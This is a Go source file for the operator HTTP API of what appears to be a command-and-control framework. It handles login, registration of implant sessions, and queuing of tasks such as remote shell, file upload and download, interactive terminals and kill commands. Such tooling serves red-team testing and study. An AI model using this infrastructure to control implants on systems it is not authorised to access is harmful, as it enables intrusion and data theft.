package api

import (
	"encoding/hex"
	"encoding/json"
	"net/http"
	"regexp"
	"strings"

	"github.com/aelder202/sable/internal/protocol"
	"github.com/aelder202/sable/internal/session"
	"github.com/google/uuid"
)

// agentIDRe restricts agent IDs to URL-safe alphanumeric+hyphen strings to prevent
// path traversal, header injection, and other misuse when IDs appear in URLs.
var agentIDRe = regexp.MustCompile(`^[a-zA-Z0-9\-]{1,64}$`)

// Config holds operator API configuration.
type Config struct {
	OperatorPasswordHash *PasswordHash
	JWTSecret            []byte
}

const (
	maxRegisterBodyBytes = 1024
	maxTaskBodyBytes     = 64 * 1024
	maxTaskPayloadBytes  = 48 * 1024
)

// Router is the operator-facing HTTP handler with security middleware applied.
type Router struct {
	mux *http.ServeMux
}

// NewRouter wires up all operator API routes with auth and security headers.
func NewRouter(store *session.Store, cfg *Config) *Router {
	mux := http.NewServeMux()
	rl := newRateLimiter()
	auth := requireJWT(cfg.JWTSecret)

	mux.HandleFunc("/api/auth/login", limitLogin(rl, loginHandler(cfg)))
	mux.Handle("/api/agents", auth(http.HandlerFunc(agentsCollectionHandler(store))))
	mux.Handle("/api/agents/", auth(http.HandlerFunc(agentRouter(store))))

	r := &Router{mux: mux}
	return r
}

// ServeHTTP applies security headers to all responses.
func (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	WithSecurityHeaders(r.mux).ServeHTTP(w, req)
}

// agentsCollectionHandler handles GET /api/agents (list) and POST /api/agents (register).
func agentsCollectionHandler(store *session.Store) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			agents := store.List()
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(agents) //nolint:errcheck
		case http.MethodPost:
			registerAgentHandler(store, w, r)
		default:
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		}
	}
}

// registerAgentHandler pre-registers an agent session so it can begin beaconing.
// The operator must call this before deploying an implant built with the same
// agent ID and secret. Request body: {"id": "<uuid>", "secret_hex": "<64-hex-chars>"}.
func registerAgentHandler(store *session.Store, w http.ResponseWriter, r *http.Request) {
	var req struct {
		ID        string `json:"id"`
		SecretHex string `json:"secret_hex"`
	}
	if !decodeJSONBody(w, r, &req, maxRegisterBodyBytes) {
		return
	}
	if req.ID == "" || req.SecretHex == "" {
		http.Error(w, "id and secret_hex required", http.StatusBadRequest)
		return
	}
	if !agentIDRe.MatchString(req.ID) {
		http.Error(w, "id must be 1-64 alphanumeric or hyphen characters", http.StatusBadRequest)
		return
	}
	secret, err := hex.DecodeString(req.SecretHex)
	if err != nil || len(secret) != 32 {
		http.Error(w, "secret_hex must be 64 hex characters (32 bytes)", http.StatusBadRequest)
		return
	}
	store.Register(&session.Agent{
		ID:     req.ID,
		Secret: secret,
	})
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]string{"id": req.ID}) //nolint:errcheck
}

func agentRouter(store *session.Store) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		// Path: /api/agents/<id>[/task|/tasks]
		parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/agents/"), "/")
		if len(parts) == 0 || parts[0] == "" {
			http.NotFound(w, r)
			return
		}
		agentID := parts[0]
		if !agentIDRe.MatchString(agentID) {
			http.NotFound(w, r)
			return
		}
		agent, ok := store.Get(agentID)
		if !ok {
			http.NotFound(w, r)
			return
		}
		if len(parts) == 1 {
			if r.Method != http.MethodGet {
				http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(agent) //nolint:errcheck
			return
		}
		switch parts[1] {
		case "task":
			queueTaskHandler(store, agentID)(w, r)
		case "tasks":
			getTaskOutputsHandler(store, agentID)(w, r)
		case "terminal":
			if len(parts) > 2 && parts[2] == "stream" {
				terminalStreamHandler(store, agentID)(w, r)
			} else {
				http.NotFound(w, r)
			}
		default:
			http.NotFound(w, r)
		}
	}
}

func queueTaskHandler(store *session.Store, agentID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}
		if !decodeJSONBody(w, r, &req, maxTaskBodyBytes) {
			return
		}
		if len(req.Payload) > maxTaskPayloadBytes {
			http.Error(w, "payload too large", http.StatusRequestEntityTooLarge)
			return
		}
		allowed := map[string]bool{
			"shell": true, "upload": true, "download": true,
			"sleep": true, "kill": true, "interactive": true,
			"complete": true, "pathbrowse": true,
		}
		if !allowed[req.Type] {
			http.Error(w, "invalid task type", http.StatusBadRequest)
			return
		}
		if err := validateTaskRequest(req.Type, req.Payload); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		task := &protocol.Task{
			ID:      uuid.New().String(),
			Type:    req.Type,
			Payload: normalizeTaskPayload(req.Type, req.Payload),
		}
		if err := store.EnqueueTask(agentID, task); err != nil {
			http.Error(w, err.Error(), http.StatusTooManyRequests)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"task_id": task.ID}) //nolint:errcheck
	}
}

// getTaskOutputsHandler returns the task output history for a given agent.
func getTaskOutputsHandler(store *session.Store, agentID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		outputs := store.GetOutputs(agentID)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(outputs) //nolint:errcheck
	}
}
